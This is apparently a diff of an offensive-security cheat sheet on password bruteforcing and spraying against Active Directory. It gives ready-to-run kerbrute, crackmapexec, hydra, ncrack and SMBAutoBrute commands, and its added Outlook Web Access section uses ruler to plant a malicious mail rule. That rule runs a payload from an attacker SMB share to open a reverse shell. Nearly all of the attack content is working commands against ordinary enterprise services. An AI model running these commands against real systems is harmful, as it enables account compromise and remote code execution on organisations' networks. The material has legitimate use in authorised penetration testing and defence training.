@@ -10,7 +10,7 @@ description: >-
 The builtin Administrator account (RID:500) cannot be locked out of the system no matter how many failed logon attempts it accumulates.
 {% endhint %}
 
-## **Kerberos pre-auth bruteforcing**
+## <mark style="color:red;">**Kerberos pre-auth bruteforcing**</mark>
 
 The Kerberos authentication protocol works with tickets in order to grant access. A ST (Service Ticket) can be obtained by presenting a TGT (Ticket Granting Ticket). That prior TGT can only be obtained by validating a first step named "pre-authentication".
 
@@ -26,19 +26,19 @@ Kerberos pre-authentication errors are not logged in Active Directory with a nor
 
 {% embed url="https://github.com/ropnop/kerbrute" %}
 
-### Username bruteforce
+### <mark style="color:orange;">Username bruteforce</mark>
 
 ```
  ./kerbrute_linux_amd64 userenum -d domain.local --dc 10.10.10.10 usernames.txt
 ```
 
-### Password bruteforce
+### <mark style="color:orange;">Password bruteforce</mark>
 
 ```
 ./kerbrute_linux_amd64 bruteuser -d domain.local --dc 10.10.10.10 rockyou.txt username
 ```
 
-### Password spray
+### <mark style="color:orange;">Password spray</mark>
 
 ```
 root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt Password123
@@ -56,7 +56,7 @@ smartbrute.py brute -bU $USER_LIST -bP $PASSWORD_LIST kerberos -d $DOMAIN
 smartbrute.py smart -bP $PASSWORD_LIST ntlm -d $DOMAIN -u $USER -p $PASSWORD kerberos
 ```
 
-### **​​Spray a pre-generated passwords list**
+### **​​**<mark style="color:orange;">**Spray a pre-generated passwords list**</mark>
 
 Using `crackmapexec` and `mp64` to generate passwords and spray them against SMB services on the network.
 
@@ -79,7 +79,7 @@ Using `SMBAutoBrute`.
 Invoke-SMBAutoBrute -UserList "C:\ProgramData\admins.txt" -PasswordList "Password1, Welcome1, 1qazXDR%+" -LockoutThreshold 5 -ShowVerbose
 ```
 
-### **Spray passwords against the RDP service**
+## <mark style="color:red;">**RDP**</mark>
 
 Using RDPassSpray to target RDP services.
 
@@ -95,9 +95,64 @@ hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://10.1
 ncrack –connection-limit 1 -vv --user administrator -P password-file.txt rdp://10.10.10.10
 ```
 
-****
+## <mark style="color:red;">SMB</mark>
 
-### **BadPwdCount attribute**
+```
+$ crackmapexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 --users
+LDAP        10.0.2.11       389    dc01       Guest      badpwdcount: 0 pwdLastSet: <never>
+LDAP        10.0.2.11       389    dc01       krbtgt     badpwdcount: 0 pwdLastSet: <never>
+```
+
+## <mark style="color:red;">Outlook Web Access</mark>
+
+password spray against an Exchange 2016 server in a offense.local domain:
+
+```
+ruler -k --domain offense.local brute --users users --passwords passwords --verbose
+```
+
+if you are attempting to replicate this technique in your own labs, you may need to update your /etc/hosts to point to your Exchange server.
+
+If the password spray against an Exchange server was successful and you have obtained valid credentials, you can now leverage Ruler to create a malicious email rule to that will gain you remote code execution on the host that checks that compromised mailbox.
+
+validate the compromised credentials are working by checking if there are any email rules created already:
+
+```
+ruler -k --verbose --email spotless@offense.local -u spotless -p 123456  display
+```
+
+The below suggests the credentials are working and that no mail rules are set for this account yet:
+
+![](<../../.gitbook/assets/image (4).png>)
+
+### <mark style="color:orange;">Get a Shell with Malicious Rules</mark>
+
+we can use this technique to get a reverse shell:
+
+```
+#payload path:
+/root/tools/evilm64.exe
+
+# smb share and server:
+smbserver.py tools /root/tools/
+
+# setup your listener and run ruler to create a malicious email rule:
+ruler -k --verbose --email spotless@offense.local --username spotless -p 123456  add --location '\\10.0.0.5\tools\\evilm64.exe' --trigger "popashell" --name maliciousrule --send --subject popashell
+```
+
+If you want to delete the malicious email rule, do this:
+
+```
+ruler -k --verbose --email spotless@offense.local --username spotless -p 123456 delete --name maliciousrule
+```
+
+## <mark style="color:red;">MSSQL</mark>
+
+```
+use admin/mssql/mssql_enum_sql_logins
+```
+
+### <mark style="color:red;">**BadPwdCount attribute**</mark>
 
 {% hint style="info" %}
 The number of times the user tried to log on to the account using an incorrect password. A value of 0 indicates that the value is unknown.
@@ -109,4 +164,4 @@ LDAP        10.0.2.11       389    dc01       Guest      badpwdcount: 0 pwdLastS
 LDAP        10.0.2.11       389    dc01       krbtgt     badpwdcount: 0 pwdLastSet: <never>
 ```
 
-****
+***
